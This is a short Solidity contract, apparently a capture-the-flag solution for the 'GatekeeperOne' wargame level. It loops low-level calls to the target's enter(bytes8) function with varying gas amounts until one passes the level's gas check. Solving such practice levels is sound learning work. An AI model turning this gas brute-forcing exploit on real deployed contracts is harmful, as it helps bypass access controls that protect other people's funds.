import "./GatekeeperOne.sol";

pragma solidity ^0.5.0;


contract ChallengerOne {

    function register(address targetAddr, bytes8 key) public {
        GatekeeperOne target = GatekeeperOne(targetAddr);

        for (uint extraGas = 1; extraGas < 200; extraGas++) {
            (bool success, bytes memory unused) = address(target).call.gas(10 * 8191 + extraGas)(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
    }
}